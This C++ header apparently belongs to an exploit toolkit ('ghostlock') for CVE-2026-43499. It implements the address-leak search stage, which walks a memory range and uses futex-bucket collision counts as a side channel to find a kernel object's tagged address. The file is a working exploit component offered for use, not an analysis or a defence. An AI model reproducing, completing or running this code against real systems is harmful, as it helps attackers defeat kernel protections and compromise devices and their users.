#pragma once
/** @file backend/cve_2026_43499/leak/leak_search.hpp
 *  Walking the range and asking the bucket rule at every step -- the decision half of
 *  the search, with neither the kernel nor the walker written again.
 *
 *  Two pieces that already exist meet here. The walk produces addresses and tags in the
 *  order the retired tree tried them, and the bucket rule decides whether one of them is
 *  the object by asking every collided address whether it agrees. What this file adds is
 *  the composition: it stops at the first address the rule accepts, and it reports the
 *  count of what it tried, so a search that found nothing can be told apart from a search
 *  that never ran.
 *
 *  The tag matters and is why the rule is asked about the tagged address rather than the
 *  raw one: the sweep exists because the object may be reachable under a tag other than
 *  the canonical one, and a search that only asked about the raw address would report
 *  nothing on a device where the object is tagged.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/candidate_match.hpp"
#include "backend/cve_2026_43499/leak/collision_count.hpp"
#include "backend/cve_2026_43499/leak/leak_walk.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** How the search ended. */
    enum class SearchVerdict : unsigned char {
        /** The rule accepted an address: it is in the outcome. */
        Found = 0,
        /** The walk finished without the rule accepting anything. */
        NotFound = 1,
        /** Neither the walk nor the rule could be used. */
        GeometryMissing = 2,
    };

    [[nodiscard]] constexpr const char *search_verdict_name(SearchVerdict verdict) noexcept {
        switch (verdict) {
            case SearchVerdict::Found: return "ok";
            case SearchVerdict::NotFound: return "plan-missing";
            case SearchVerdict::GeometryMissing: return "geometry-missing";
        }
        return "unknown";
    }

    /** What the search did. */
    struct SearchOutcome final {
        SearchVerdict status = SearchVerdict::GeometryMissing;
        /** The address the rule accepted, tagged as it was when accepted. */
        std::uint64_t found = 0U;
        /** How many addresses were tried before it stopped, one way or the other. */
        std::size_t probes = 0U;
    };

    /** A sink that asks the rule about every probe and stops the walk the first time it
     *  is answered yes. */
    template <FutexBuckets Buckets>
    struct MatchingSink final {
        const Buckets *buckets = nullptr;
        const std::uint64_t *addresses = nullptr;
        std::size_t address_count = 0U;
        /** How many of the armed addresses must agree: the profile collision count. Zero is
         *  refused, because a search with no threshold answers with the first candidate it
         *  sees. */
        std::size_t collisions_needed = 0U;
        SearchOutcome outcome{};

        [[nodiscard]] bool on_probe(const LeakProbe &probe) noexcept {
            ++outcome.probes;
            if (buckets == nullptr || collisions_needed == 0U) {
                outcome.status = SearchVerdict::GeometryMissing;
                return false;
            }
            const std::uint64_t candidate = tagged_candidate(probe.address, probe.tag);
            const MatchVerdict verdict =
                candidate_matches(*buckets, addresses, address_count, candidate);
            /* Agreement is necessary and not enough: the count is what says the candidate is
             *  where the armed addresses are, at least as many of them as the profile asks. */
            const std::size_t agreed =
                count_bucket_agreements(*buckets, addresses, address_count, candidate);
            if (verdict == MatchVerdict::Matches && enough_agreements(agreed, collisions_needed)) {
                outcome.found = candidate;
                outcome.status = SearchVerdict::Found;
                return false;
            }
            if (verdict == MatchVerdict::TooFewToCompare) {
                outcome.status = SearchVerdict::GeometryMissing;
                return false;
            }
            return true;
        }
    };

    /** Search the range for the object. The sink is internal: a caller gets the outcome
     *  rather than a callback to fill in. */
    template <FutexBuckets Buckets>
    [[nodiscard]] SearchOutcome search_for_object(const ScanStrides &strides, const ScanRange &range,
                                                  bool sweep_tags, const Buckets &buckets,
                                                  const std::uint64_t *addresses,
                                                  std::size_t address_count,
                                                  std::size_t collisions_needed) noexcept {
        MatchingSink<Buckets> sink{};
        sink.collisions_needed = collisions_needed;
        sink.buckets = &buckets;
        sink.addresses = addresses;
        sink.address_count = address_count;
        /* Until something says otherwise the search has not found anything. The sink
         *  starts at the same answer, so a walk that simply runs out is reported as
         *  finding nothing rather than as a geometry it never complained about. */
        sink.outcome.status = SearchVerdict::NotFound;
        const WalkVerdict walk = walk_leak_candidates(strides, range, sweep_tags, sink);
        if (sink.outcome.status == SearchVerdict::Found) {
            return sink.outcome;
        }
        if (walk == WalkVerdict::GeometryMissing || sink.outcome.status == SearchVerdict::GeometryMissing) {
            sink.outcome.status = SearchVerdict::GeometryMissing;
            return sink.outcome;
        }
        sink.outcome.status = SearchVerdict::NotFound;
        return sink.outcome;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
